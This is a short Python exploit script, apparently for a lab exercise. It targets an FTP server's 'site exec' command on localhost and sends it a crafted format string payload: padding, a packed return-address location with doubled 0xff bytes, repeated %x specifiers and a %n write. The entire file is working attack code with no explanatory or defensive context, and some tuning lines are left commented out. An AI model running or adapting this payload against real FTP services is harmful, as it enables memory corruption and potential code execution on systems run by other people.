#!/usr/bin/env python3

import socket
import struct

POPS = 21
PAD_BYTES = 2
# RETURN_ADDR_LOC = 0xffff931c
RETURN_ADDR_LOC = 0xffffb50c


def banner(s):
    print(s.recv(1024))


def login(s):
    s.send(b'user user\n')
    print(s.recv(1024))
    s.send(b'pass password\n')
    print(s.recv(1024))


def craft_exploit_string(pops, pad_bytes, return_addr_loc):
    exploit_str = pad_bytes * b'a'

    exploit_str += struct.pack('<I', return_addr_loc).replace(b'\xff', b'\xff\xff')
    # bytes_written = len(exploit_str.replace(b'\xff\xff', b'\xff'))

    exploit_str += b'%x' * pops
    # bytes_written += 8 * (pops - 1)
    # exploit_str += b'%' + bytes(str(0x8888 - bytes_written), 'utf-8') + b'x'
    # exploit_str += b'%' + bytes(str(0x88), 'utf-8') + b'x'

    exploit_str += b'%n'

    return exploit_str


def site_exec(s, msg):
    s.send(b'site exec ' + msg + b'\n')
    r = s.recv(40000)
    print(r)
    if r:
        print(len(r.split(b'\r\n')[0]))
    return r


def exploit(s):
    banner(s)
    login(s)
    input('Enter anything to continue..')
    exploit_str = craft_exploit_string(POPS, PAD_BYTES, RETURN_ADDR_LOC)
    print(f'[*] Exploit crafted:')
    print(exploit_str)
    site_exec(s, exploit_str)


def main():
    with socket.socket() as s:
        s.connect(('localhost', 21))
        exploit(s)


if __name__ == '__main__':
    main()
